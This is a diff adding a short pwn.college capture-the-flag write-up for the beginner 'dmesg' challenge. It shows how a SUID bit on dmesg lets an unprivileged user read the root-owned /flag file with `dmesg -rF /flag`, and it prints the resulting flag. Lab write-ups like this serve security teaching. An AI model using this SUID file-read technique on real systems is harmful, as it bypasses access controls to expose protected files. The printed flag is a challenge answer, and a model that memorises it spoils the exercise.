@@ -1,0 +1,40 @@
+# Challenge Name: dmesg
+**Category**: Program Misuse  
+**Platform**: pwn.college  
+**Difficulty**: Beginner  
+**Date**: 2025-07-16  
+**Author**: Himanshu Parate
+
+---
+
+## 🧠 Summary:
+The challenge abuses a SUID bit set on `/usr/bin/dmesg`, allowing an unprivileged user to read the root-owned flag file at `/flag`.
+
+---
+
+## 🔍 Enumeration
+
+```bash
+ls -l /usr/bin/dmesg
+```
+
+Output:
+```
+-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/dmesg
+```
+
+- The `s` in `-rws` indicates it's a SUID binary.
+- `dmesg` runs with **root privileges**.
+
+## 🚀 Exploitation
+
+The `dmesg` command in Linux shows kernel ring buffer messages — basically, it's where the kernel logs messages about hardware, drivers, boot process, system errors, and crashes.
+
+```bash
+dmesg -rF /flag
+```
+
+Output:
+```
+pwn.college{0qBxPdd6cw8sKdIqImP5FUD_suQ.dhDOxwSM0IzMyEzW}
+```
